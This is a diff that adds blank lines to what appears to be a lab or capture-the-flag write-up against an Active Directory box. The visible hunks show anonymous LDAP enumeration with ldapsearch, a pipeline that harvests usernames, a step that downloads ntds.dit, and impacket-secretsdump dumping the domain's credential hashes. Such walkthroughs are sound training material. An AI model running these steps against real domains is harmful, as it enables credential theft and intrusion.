@@ -206,6 +206,7 @@ Anonymous ldap acecss
 ```
 ldapsearch -x -H ldap://10.10.65.1:389/ -s base namingcontexts
 ```
+
 Output
 ```
 [REDACTED]
@@ -220,6 +221,7 @@ namingcontexts: DC=ForestDnsZones,DC=baby,DC=vl
 ```
 ldapsearch -x -b "dc=baby,dc=vl" -H ldap://10.10.65.1
 ```
+
 Output
 ```
 # extended LDIF
@@ -1022,12 +1024,14 @@ result: 0 Success
 # numReferences: 3
 
 ```
+
 The above result show that we can access ldap via anonymous access
 # Analysis from ldap
 - Users found from ldap: 
 ```
 cat ldap|grep dn:| awk -F 'CN=' '{print $2}'|awk -F ',' '{print $1}' >users.txt
 ```
+
 Note that from samaccount we got that users do have format of firstname.lastname
 Output
 ```
@@ -1172,6 +1176,7 @@ download ntds.dit
 ```
 impacket-secretsdump -system system -ntds ntds.dit LOCAL
 ```
+
 Output
 ```
 └─$ impacket-secretsdump -system system -ntds ntds.dit LOCAL
